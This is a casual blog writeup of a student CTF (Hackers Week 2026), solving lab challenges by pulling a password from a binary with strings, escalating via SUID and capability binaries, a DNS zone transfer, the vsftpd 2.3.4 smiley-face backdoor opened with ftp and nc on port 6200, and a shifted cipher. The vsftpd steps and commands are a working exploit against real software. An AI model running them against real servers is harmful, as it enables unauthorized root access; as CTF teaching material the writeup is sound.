@@ -1,0 +1,265 @@
+---
+title: 'hackers week 2026 ctf (basic) writeup - 3rd place'
+description: 'UMA hackers week CTF writeup! (basic level)'
+date: 2026-03-13
+authors: ['srizan']
+tags: ['ctf', 'cybersec']
+---
+
+## disclaimer
+
+cybersec is not my main "field of work", it's rather software/webdev etc etc so this was a bit unexpected.
+
+i have sometimes dabbled into pentesting but i'm not the best at it at all.
+
+keep in mind that this is not a serious writeup, so my english may be a small bit sloppy at times.
+
+## misc - linux executable
+
+solve numero uno.
+
+```
+Realizando un análisis forense de Helix Corp., Hemos recuperado un ejecutable Linux llamado "candado_meta" que protege una flag mediante contraseña. No disponemos de la contraseña, pero sospechamos que el desarrollador dejó demasiada información dentro del propio ejecutable
+```
+
+i first ran the executable to see what happens:
+
+```=== Helix Locker v1.0 ===
+Introduce la contrasena correcta para desbloquear la flag.
+>
+```
+
+badly compiled linux executables can usually be exploited with `strings` (i think i learned this from john hammond), thus i:
+
+```
+$ strings candado_meta
+[...]
+author=Hackers Week
+challenge=REV-META1
+difficulty=principiante
+password=LlaveMeta_2026
+hint=Los metadatos del ejecutable dicen mas de lo que parece
+[...]
+```
+
+aand that was the password lmao
+
+typing it in:
+
+```=== Helix Locker v1.0 ===
+Introduce la contrasena correcta para desbloquear la flag.
+> LlaveMeta_2026
+\n[+] Acceso concedido. Tu flag es: flag_metadatos_no_son_solo_comentarios\n
+```
+
+## linux - permissions 1
+
+```
+Durante el análisis forense de los sistemas de Helix Corp, el equipo de respuesta ha obtenido acceso a una cuenta de usuario sin privilegios en uno de los servidores internos.
+[...]
+El equipo de sistemas dejó instalada una herramienta de diagnóstico personalizada que, según la documentación interna, “requiere permisos elevados para acceder a logs del sistema”. Analiza cómo está configurada. El objetivo es escalar privilegios para leer el fichero de flag protegido por root. La solución de este reto es el fichero de flag protegido por root. La flag deseada empieza por “flag_”
+```
+
+yeah so i basically sshed and greeted with a shell, i ran the clue:
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║           HELIX CORP — SISTEMA DE ANÁLISIS FORENSE           ║
+║                     RETO PRIV-02                             ║
+╚══════════════════════════════════════════════════════════════╝
+
+  Bienvenido, analyst.
+  Tu misión: leer /root/flag.txt
+
+  El equipo de sistemas instaló herramientas de diagnóstico.
+  Alguna fue configurada de forma incorrecta...
+
+  Pista: find / -perm -4000 2>/dev/null
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+analyst@helix-server:~$ find / -perm -4000 2>/dev/null
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/local/bin/helix-reader
+analyst@helix-server:~$
+```
+
+i tried escalating with executables such as su, chsh or `mount`ing the filesystem somewhere, i just tried running `helix-reader`:
+
+```
+analyst@helix-server:~$ /usr/local/bin/helix-reader
+Uso: helix-reader <fichero>
+Herramienta de diagnostico - Helix Corp
+```
+
+this can just- read files? no way...
+
+```
+analyst@helix-server:~$ /usr/local/bin/helix-reader /root/flag.txt
+flag_su1d_b1t_1s_d4ng3r0us
+```
+
+okay
+
+## linux - permisos (2)
+
+```
+╔══════════════════════════════════════════════════════════════╗
+║           HELIX CORP — SISTEMA DE ANÁLISIS FORENSE           ║
+║                     RETO PRIV-04                             ║
+╚══════════════════════════════════════════════════════════════╝
+
+  Bienvenido, analyst.
+  Tu misión: leer /root/flag.txt
+
+  El admin usó capabilities en lugar de SUID. ¿Es más seguro?
+  Pista: find -perm -4000 no te ayudará esta vez...
+
+  Intenta: getcap -r / 2>/dev/null
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+analyst@helix-server:~$ getcap -r / 2>/dev/null
+/usr/local/bin/helix-escalate cap_setuid=ep
+/usr/local/bin/helix-capread cap_dac_read_search=ep
+```
+
+this one uses linux capabilities, but it's basically the same drill:
+
+```
+analyst@helix-server:~$ /usr/local/bin/helix-escalate
+[*] helix-escalate — herramienta de mantenimiento
+[*] UID actual: 1000
+[*] UID tras escalada: 0
+[*] Lanzando shell de mantenimiento...
+
+root@helix-server:~# cat /root/flag.txt
+flag_c4p4b1l1t13s_4r3_subt13
+root@helix-server:~#
+```
+
+this executable escalated me to root and let me `cat` the flag up through there.
+
+## dns y transferencia de zona
+
+```
+Para este reto hay que saber manejar las consultas a dominios con DNS. El reto contiene única flag final almacenada en un registro TXT que está oculto por oscuridad. Encontrarlo es muy sencillo si se conoce y explota el concepto de transferencia de zona. [...]
+La solución a este reto se adquiere realizando la operación DNS necesaria.
+```
+
+okay this one i had to get a docker container up and running, and some firewall issues made me change the dns ports but ANYWAY
+
+this was basically a [dns zone transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer). in the real world, it lets you replicate dns records.
+
+i knew it had something to do with `dig`, and there turns out to be an `AXFR` query, which i found after trying to query `TXT` with no avail:
+
+```
+…/Downloads/ctf ✗ dig axfr @172.17.0.2 midominio.com
+
+; <<>> DiG 9.20.20 <<>> axfr @172.17.0.2 midominio.com
+; (1 server found)
+;; global options: +cmd
+[...]
+midominio.com.  10800 IN A 192.168.1.100
+4Eb7w8\@yYnaNLua.midominio.com. 10800 IN TXT "flag{dns_axfr_easy}"
+api.midominio.com. 10800 IN A 192.168.1.109
+[...]
+;; Query time: 0 msec
+;; SERVER: 172.17.0.2#53(172.17.0.2) (TCP)
+;; WHEN: Fri Mar 13 16:46:34 CET 2026
+;; XFR size: 23 records (messages 1, bytes 635)
+```
+
+there it was.
+
+## ftp server hacking
+
+this one was fun!
+
+after deploying the docker container, i ran `nmap` to look at what we're dealing with. note that this was what took me the most time, since i'm not familiar with pentesting tools:
+
+```
+…/Downloads/ctf ❯ nmap -sC -sV 172.17.0.3 21
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 16:50 +0100
+Nmap scan report for 172.17.0.3
+Host is up (0.00036s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 2 IP addresses (1 host up) scanned in 8.02 seconds
+```
+
+after a quick search, this version is vulnerable to [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523), a 9.8 critical vulnerability which opened a backdoor. it works like this:
+
+1. open a terminal, ftp into it and type in `<anything>:)` as the username (yes, a smiley face!)
+
+```
+…/Downloads/ctf ❯ ftp 172.17.0.3
+Connected to 172.17.0.3.
+220 (vsFTPd 2.3.4)
+Name (172.17.0.3:srizan): asdf:)
+331 Please specify the password.
+Password:
+
+bkjasfbjaefklnekl
+
+```
+
+1. it gets stuck! now open another terminal and nc into 6200/tcp.
+
+```
+…/Downloads/ctf ❯ nc 172.17.0.3 6200
+uname -a
+Linux 2b93f9674b30 6.18.13-arch1-1 #1 SMP PREEMPT_DYNAMIC Wed, 25 Feb 2026 23:12:35 +0000 x86_64 x86_64 x86_64 GNU/Linux
+pwd
+/root/vsftpd-2.3.4
+cat /root/flag.txt
+flag{backdoor_vsftp}
+```
+
+my friend rafa found a metasploit script that automates the process, which is a cool alternative :)
+
+## guardo contraseñas en ficheros
+
+i did this one 10 minutes before the lb closed, which was a bit tense. it led me to #3!
+
+downloaded the zip and opened the only file:
+
+```
+<node TEXT="B) Desplegar la plataforma CTFd" FOLDED="true" POSITION="bottom_or_right" ID="ID_106505589" CREATED="1773069180871" MODIFIED="1773069195865">
+<edge COLOR="#00ff00"/>
+<font SIZE="12"/>
+<node TEXT="Formato: ROT11" ID="ID_1250935731" CREATED="1773069228152" MODIFIED="1773069292783" LINK="https://en.wikipedia.org/wiki/Caesar_cipher"/>
+<node TEXT="User: rroman@uma.es" ID="ID_504947160" CREATED="1773069294360" MODIFIED="1773069305837"/>
+<node TEXT="Password: qwlr_yzecgnphtesespqgctpd" ID="ID_858155904" CREATED="1773069306505" MODIFIED="1773069704629"/>
+</node>
+```
+
+dang interesting. that is not the flag, but it looks shifted.
+
+pasting the string into dcode.fr's [cipher identifier](https://www.dcode.fr/cipher-identifier), there were a few, so i mainly tried `delastelle trifid` and `caesar`, to no avail.
+
+thankfully, after trying [`shift`](https://www.dcode.fr/shift-cipher) and letting it do some brute force, i ended up finding this!
+
+```
+[(+11)/c]: flag_notrvcewiththefvries
+```
+
+# final acknowledgements
+
+thanks to these awesome people for making my experience truly unforgettable!
+
+- rafa, hugo, dario and all other people i got to meet: y'all were awesome! sorry if this list is not very exhaustive, i'm awful at names. praying we can reunite on nasa spaceapps or something
+- hackers week organizers: thanks for making it so fun! order more large sized t-shirts next time :'D
+- eligius hendrix: in case he reads this, you're such a cool professor! in retrospect i feel kind of bad for not letting you know i sneaked in class. hope i can take your classes one day!
+- my spanish teacher: thanks for delaying my exam so i could attend
+
+ps: i won't be switching to opensuse for the forseeable future
